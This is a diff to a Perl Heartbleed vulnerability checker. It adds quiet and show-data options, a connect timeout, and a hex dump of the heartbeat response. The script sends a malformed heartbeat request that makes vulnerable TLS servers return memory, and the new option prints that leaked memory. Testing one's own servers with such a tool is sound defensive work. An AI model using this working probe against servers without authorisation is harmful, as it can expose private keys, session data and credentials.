@@ -11,6 +11,8 @@ my $starttls = sub {1};
 my $starttls_arg;
 my $timeout = 5;
 my $heartbeats = 1;
+my $quiet = 0;
+my $show = 0;
 my %starttls = (
     'smtp' => \&smtp_starttls,
     'http' => \&http_connect,
@@ -28,6 +30,8 @@ Usage: $0 [ --starttls proto[:arg] ] [ --timeout T ] host:port
 			   starttls protocol (imap,smtp,http,pop)
   -T|--timeout T         - use timeout (default 5)
   -H|--heartbeats N      - number of heartbeats (default 1)
+  -s|--show-data         - show heartbeat response if vulnerable
+  -q|--quiet             - don't show anything, exit 1 if vulnerable
   -h|--help              - this screen
 
 Examples:
@@ -57,6 +61,8 @@ GetOptions(
     'h|help' => sub { usage() },
     'T|timeout=i' => \$timeout,
     'H|heartbeats=i' => \$heartbeats,
+    's|show-data' => \$show,
+    'q|quiet' => \$quiet,
     'starttls=s' => sub {
 	(my $proto,$starttls_arg) = $_[1] =~m{^(\w+)(?::(.*))?$};
 	usage("invalid starttls protocol $_[1]") if ! $proto
@@ -65,7 +71,8 @@ GetOptions(
 );
 
 my $dst = shift(@ARGV) or usage("no destination given");
-my $cl = IO::Socket::INET->new($dst) or die "failed to connect: $!";
+my $cl = IO::Socket::INET->new(PeerAddr => $dst, Timeout => $timeout)
+    or die "failed to connect: $!";
 $starttls->($cl);
 
 # client hello with heartbeat extension
@@ -94,21 +101,23 @@ while (1) {
 # heartbeat request with wrong size
 # taken from http://s3.jspenguin.org/ssltest.py
 for(1..$heartbeats) {
-    warn "...send heartbeat#$_\n";
+    verbose("...send heartbeat#$_");
     print $cl pack("H*",join('',qw(18 03 02 00 03 01 40 00)));
 }
 if ( my ($type,$ver,$buf) = _readframe($cl)) {
     if ( $type == 21 ) {
-	warn "received alert (probably not vulnerable)\n";
+	verbose("received alert (probably not vulnerable)");
     } elsif ( $type != 24 ) {
-	warn "unexpected reply type $type\n";
+	verbose("unexpected reply type $type");
     } elsif ( length($buf)>3 ) {
-	warn "BAD! got ".length($buf)." bytes back instead of 3 (vulnerable)\n";
+	verbose("BAD! got ".length($buf)." bytes back instead of 3 (vulnerable)");
+	show_data($buf) if $show;
+	exit 1;
     } else {
-	warn "GOOD proper heartbeat reply (not vulnerable)\n";
+	verbose("GOOD proper heartbeat reply (not vulnerable)");
     }
 } else {
-    warn "no reply - probably not vulnerable\n";
+    verbose("no reply - probably not vulnerable");
 }
 
 sub _readframe {
@@ -128,12 +137,12 @@ sub _readframe {
 	    my ($ht,$len) = unpack("Ca3",substr($buf,0,4,''));
 	    $len = unpack("N","\0$len");
 	    push @msg,[ $ht,substr($buf,0,$len,'') ];
-	    warn sprintf("...ssl received type=%d ver=0x%x ht=0x%x size=%d\n",
+	    verbose("...ssl received type=%d ver=0x%x ht=0x%x size=%d",
 		$type,$ver,$ht,length($msg[-1][1]));
 	}
     } else {
 	@msg = $buf;
-	warn sprintf("...ssl received type=%d ver=%x size=%d\n",
+	verbose("...ssl received type=%d ver=%x size=%d",
 	    $type,$ver,length($buf));
     }
 
@@ -149,7 +158,7 @@ sub smtp_starttls {
     }
     print $cl "STARTTLS\r\n";
     my ($reply) = <$cl> =~m{^(\d+)};
-    warn "...reply to starttls: $reply\n";
+    verbose("...reply to starttls: $reply");
     return 1 if $reply =~m{^2};
     die "no starttls supported\n";
 }
@@ -161,7 +170,8 @@ sub imap_starttls {
     while (<$cl>) {
 	m{^abc (OK)?} or next;
 	$1 or die "STARTTLS failed: $_";
-	warn "...starttls: $_";
+	s{\r?\n$}{};
+	verbose("...starttls: $_");
 	return 1;
     }
 }
@@ -172,7 +182,8 @@ sub pop_stls {
     print $cl "STLS\r\n";
     my $reply = <$cl>;
     die "STLS failed: $reply" if $reply !~m{^\+OK};
-    warn "...stls $reply";
+    $reply =~s{\r?\n}{};
+    verbose("...stls $reply");
     return 1;
 }
 
@@ -187,4 +198,30 @@ sub http_connect {
     }
     $hdr =~m{^HTTP/1\.[01]\s+2\d\d} and return 1;
     die "CONNECT failed: $hdr\n";
+}
+
+sub verbose {
+    return if $quiet;
+    my $msg = shift;
+    $msg = sprintf($msg,@_) if @_;
+    print STDERR $msg,"\n";
+}
+
+sub show_data {
+    my $data = shift;
+    my $lastd = '';
+    my $repeat = 0;
+    while ( $data ne '' ) {
+	my $d = substr($data,0,16,'' );
+	$repeat++,next if $d eq $lastd;
+	$lastd = $d;
+	if ( $repeat ) {
+	    print STDERR "... repeated $repeat times ...\n";
+	    $repeat = 0;
+	}
+	( my $h = unpack("H*",$d)) =~s{(..)}{$1 }g;
+	( my $c = $d ) =~s{[\x00-\x20\x7f-\xff]}{.}g;
+	printf STDERR "%48s  %16s\n",$h,$c;
+    }
+    print STDERR "... repeated $repeat times ...\n" if $repeat;
 }
